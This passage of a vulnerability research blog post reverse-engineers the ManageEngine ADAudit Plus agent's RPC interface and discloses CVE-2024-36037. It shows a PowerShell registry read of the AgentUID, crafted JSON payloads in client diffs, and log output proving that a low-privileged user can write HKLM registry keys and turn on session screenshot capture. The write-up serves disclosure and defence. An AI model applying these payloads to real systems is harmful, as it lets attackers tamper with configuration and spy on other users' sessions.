(line 2) that compares a JSON key named <code>AgentUID</code> with a value fetched by <code>DataStore.Get()</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-csharp" data-lang="csharp"><span style="display:flex;"><span>Hashtable msgMap = JsonAPI.JsonToHashtable(msgStr);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (msgMap.ContainsKey(<span style="color:#e6db74">&#34;AgentUID&#34;</span>) &amp;&amp; DataStore.Get(<span style="color:#e6db74">&#34;AgentUID&#34;</span>).ToString().Equals(msgMap[<span style="color:#e6db74">&#34;AgentUID&#34;</span>].ToString()))
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			errStatus = <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>			JObject json = JObject.Parse(msgStr);
</span></span><span style="display:flex;"><span>			json.Remove(<span style="color:#e6db74">&#34;AgentUID&#34;</span>);
</span></span><span style="display:flex;"><span>			json.Remove(<span style="color:#e6db74">&#34;ADAP_SERVER_DNS_NAME&#34;</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">string</span> jsonMsgStr = JsonAPI.ObjectToJsonString(json);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">switch</span> (notifyId)
</span></span><span style="display:flex;"><span>			{
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>				DataStore.Update(jsonMsgStr);
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">goto</span> IL_24F;
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">[...]</span>
</span></span></code></pre></div><p>The <code>DataStore.Get()</code> seems to fetch data from the Windows Registry:</p>
<p><img src="adauditagent-datastore-registry.png" alt="adauditagent-datastore-registry"></p>
<p>At this location in the Windows registry the <code>AgentUID</code> is stored:</p>
<p><img src="agentuid-fetched-from-windows-registry.png" alt="agentuid-fetched-from-windows-registry"></p>
<p>What this information tells us is that we cannot successfully communicate with the
ADAudit Agent over the network as we do not know the <code>AgentUID</code>. If we fail to match the <code>AgentUID</code>
we fall into to else statement which skips over all the fun cases:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>		{
</span></span><span style="display:flex;"><span>			Logger.Msgr.ErrorFormat(<span style="color:#e6db74">&#34;synced from unknown server : ServerName :: {0}&#34;</span>, msgMap[<span style="color:#e6db74">&#34;ADAP_SERVER_DNS_NAME&#34;</span>]);
</span></span><span style="display:flex;"><span>		}
</span></span></code></pre></div><p>However, we are allowed to read
registry item from a low-privileged session on the machine, meaning that we still
can turn this <em>something</em> that we have into a local attack.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&gt; (Get-ItemProperty -Path <span style="color:#e6db74">&#34;HKLM:\SOFTWARE\ManageEngine\ADAP&#34;</span> -Name AgentUID).AgentUID
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1699964702085</span>
</span></span></code></pre></div><p>Lets see if <code>case 0:</code> is reachable if a correct <code>AgentUID</code> is provided:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span><span style="color:#f92672">-    long arg_0 = 0;
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-    wchar_t arg_1[] = L&#34;snus&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#f92672">-    long arg2_pointer;
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    long arg_0 = 0;
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    wchar_t arg_1[] = L&#34;{\&#34;AgentUID\&#34;:\&#34;1699964702085\&#34;,\&#34;snus\&#34;:\&#34;true\&#34;}&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    long arg2_pointer;
</span></span></span></code></pre></div><p>Build, execute, check the logs:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&gt; Get-Content <span style="color:#e6db74">&#39;C:\Program Files\ManageEngine\ADAuditPlusAgent\Logs\MessengerLog_2023_12_01.txt&#39;</span> -Tail <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">10</span>][<span style="color:#66d9ef">INFO ][Messenger</span>] <span style="color:#960050;background-color:#1e0010">:</span> NATV.FA_NotifyAgentStr :: notification from ADAP server, notifyId <span style="color:#960050;background-color:#1e0010">:</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Look successful. But what happened? Search through all logs..</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&gt; Get-ChildItem <span style="color:#e6db74">&#39;C:\Program Files\ManageEngine\ADAuditPlusAgent\Logs\*&#39;</span> | Select-String snus
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>AgentLog_2023_12_01.txt<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">103</span><span style="color:#960050;background-color:#1e0010">:</span>[<span style="color:#ae81ff">2023</span>-<span style="color:#ae81ff">12</span>-<span style="color:#ae81ff">01</span> <span style="color:#ae81ff">20</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">14</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">55</span>,<span style="color:#ae81ff">884</span>] [<span style="color:#ae81ff">10</span>][<span style="color:#66d9ef">INFO ][Default</span>] <span style="color:#960050;background-color:#1e0010">:</span> Set Registry Key<span style="color:#960050;background-color:#1e0010">:</span> HKEY_LOCAL_MACHINE\SOFTWARE\ManageEngine\ADAP\snus = true
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Now we are getting somewhere. We have the ability to write arbitrary registry
entries in the <code>HKEY_LOCAL_MACHINE\SOFTWARE\ManageEngine\ADAP</code> location which
should only be writable by high-privileged users. And we can do this
from a local low-privileged user. Very nice.</p>
<p><img src="arbitrary-registry-changes.png" alt="arbitrary-registry-changes"></p>
<p>&lt;insert celebration dance and get more coffee&gt;</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> Create a valid IDL structure</li>
<li><input checked="" disabled="" type="checkbox"> Brew a large can of coffee</li>
<li><input checked="" disabled="" type="checkbox"> Build a RPC client</li>
<li><input checked="" disabled="" type="checkbox"> Guess a lot</li>
<li><input checked="" disabled="" type="checkbox"> Create input data that will be marshalled into a valid stub that server will act on.</li>
</ul>
<p>The last step is now completed on the initial to do-list. But more reversing
is needed to reach our en goal. Remember the <code>SessionMonitoring</code> feature which
was the targetted functionality?</p>
<p><code>SessionMonitoring</code> seems to be enabled by the registry item <code>SMStatus</code> in
<code>HKEY_LOCAL_MACHINE\SOFTWARE\ManageEngine\ADAP\SessionMonitoring</code></p>
<p><img src="registry-showing-how-to-enable-sessionmonitoring.png" alt="registry-showing-how-to-enable-sessionmonitoring"></p>
<p>By reviewing the decompiled code of the <code>ADAPAgent.exe</code> function <code>DataStore</code>
we notice that if we input <code>SMData</code> as a JSON key we can reach
<code>DataStore.UpdateSMDetails</code> which looks promising.</p>
<p><img src="dotnet-sourcecode-showing-howto-reach-smdata.png" alt="dotnet-sourcecode-showing-howto-reach-smdata"></p>
<p><img src="dotnet-code-showing-how-to-enable-sessionmonitoring.png" alt="dotnet-code-showing-how-to-enable-sessionmonitoring"></p>
<p>Let&rsquo;s update our custom ADAuditAgentRPC client POC with a nested JSON object
such as:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;AgentUID&#34;</span>:<span style="color:#e6db74">&#34;1699964702085&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;SMData&#34;</span>:{
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;SMStatus&#34;</span>:<span style="color:#e6db74">&#34;True&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span><span style="color:#f92672">-  wchar_t arg_1[] = L&#34;{\&#34;AgentUID\&#34;:\&#34;1699964702085\&#34;,\&#34;snus\&#34;:\&#34;true\&#34;}&#34;;
</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+  wchar_t arg_1[] = L&#34;{\&#34;AgentUID\&#34;:\&#34;1699964702085\&#34;,\&#34;SMData\&#34;:{\&#34;SMStatus\&#34;:\&#34;True\&#34;}}&#34;;
</span></span></span></code></pre></div><p>Build, execute, check the logs:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>&gt; Get-Content <span style="color:#e6db74">&#39;C:\Program Files\ManageEngine\ADAuditPlusAgent\Logs\AgentLog_2023_12_02.txt&#39;</span> | Select-String SMSTatus
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>[<span style="color:#ae81ff">2023</span>-<span style="color:#ae81ff">12</span>-<span style="color:#ae81ff">02</span> <span style="color:#ae81ff">10</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">28</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">29</span>,<span style="color:#ae81ff">988</span>] [<span style="color:#ae81ff">9</span>][<span style="color:#66d9ef">INFO ][Default</span>] <span style="color:#960050;background-color:#1e0010">:</span> Set Registry Key<span style="color:#960050;background-color:#1e0010">:</span> HKEY_LOCAL_MACHINE\SOFTWARE\ManageEngine\ADAP\SessionMonitoring\SMStatus = True
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Great success!</p>
<h2 id="summary">Summary</h2>
<p>So what we actually managed to do is to enable the SessionMonitoring feature from a local
low privileged user. When this feature is enabled and when a user logs
into the machine screenshots will be taken
with 1 seconds interval and stored in the directory <code>C:\ProgramData\ManageEngine\ADAuditPlus Agent\SessionMonitoring</code>. This directory is readable by all local users and enables an attacker
to monitor other sessions.</p>
<p>In addition all configuration parameter stored in the registry at
<code>HKEY_LOCAL_MACHINE\SOFTWARE\ManageEngine\ADAP</code> is under the attackers control.</p>
<p>POC:</p>

    

<video width=100% controls autoplay>
    <source src="/video/adauditpoc.webm" type="video/webm">
    Your browser does not support the video tag.
</video>



<p>The permissive folder permission allowing all users to view the screenshots
was assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-36037">CVE-2024-36037</a> and was fixed in <a href="https://www.manageengine.com/products/active-directory-audit/adaudit-plus-release-notes.html">Build 7270 (Dec 29, 2023)</a></p>
<blockquote>
<p>Fixes</p>
<p>A few changes focused on hardening the security of agent data have been implemented.</p>
</blockquote>
<p>However, one crucial part regarding the ADAudit Agent RPC client was overseen. Remember the first sentence in part 1:</p>
<blockquote>
<p>&ldquo;<em>The objective when this research started was actually to find a new way to leverage an old CVE</em>&rdquo;</p>
</blockquote>
<p>&hellip; We are not using the latest version.</p>
<p>Continue reading part 3 to find out which mitigation that was already in place,
preventing exploitation of the RPC security issue, and how it was bypassed.</p>
<p>Part 3: <a href="/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/">https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part3/</a></p>
<p>Or if you missed part 1: <a href="/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part1/">https://www.shelltrail.com/research/manageengine-adaudit-reverse-engineering-windows-rpc-to-find-cve-2024-36036-and-cve-2024-36037-part1/</a></p>

    </div>

    



    
      








  





  
  
  
    
  
  
  <div class="media author-card" itemscope itemtype="http://schema.org/Person">
    

    <div class="media-body">
      <h5 class="card-title" itemprop="name"><a href="https://www.shelltrail.com/"></a></h5>
      
      
      <ul class="network-icon" aria-hidden="true">
        
      </ul>
    </div>
  </div>



      
      
    

    

    


  </div>
</article>

      

    
    

    
    
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" integrity="sha256-X5PoE3KU5l+JcX+w09p/wHl9AzK333C4hJ2I9S5mD4M=" crossorigin="anonymous"></script>

      

      
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.6/highlight.min.js" integrity="sha256-aYTdUrn6Ow1DDgh5JTc3aDGnnju48y/1c8s1dgkYPQ8=" crossorigin="anonymous"></script>
        
      

      
      
    

    
    

    
    
    

    
    
    <script>hljs.initHighlightingOnLoad();</script>
    

    

    
    

    

    
    

    
    

    
    
    
    
    
    
    
    
    
    
    
    
    <script src="/js/academia.min.6c2ba2801d406881b3c2277043cedd76.js"></script>

    






  
  <div class="container">
    <footer class="site-footer">
  <div class="container">
    <div class="row align-items-center">
      <div class="col-md-6 mb-4 mb-md-0">
        
        <p class="mb-0">
          Copyright © 2025 &middot; 
	  Shelltrail AB 559319-6164
        </p>
      </div>
      <div class="col-md-6">
        <ul class="list-inline network-icon text-right mb-0">
          
          
        </ul>
      </div>
    </div>
  </div>
</footer>

  </div>
  

  
<div id="modal" class="modal fade" role="dialog">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Cite</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <pre><code class="tex hljs"></code></pre>
      </div>
      <div class="modal-footer">
        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
          <i class="fas fa-copy"></i> Copy
        </a>
        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
          <i class="fas fa-download"></i> Download
        </a>
        <div id="modal-error"></div>
      </div>
    </div>
  </div>
</div>

</body>
</html>
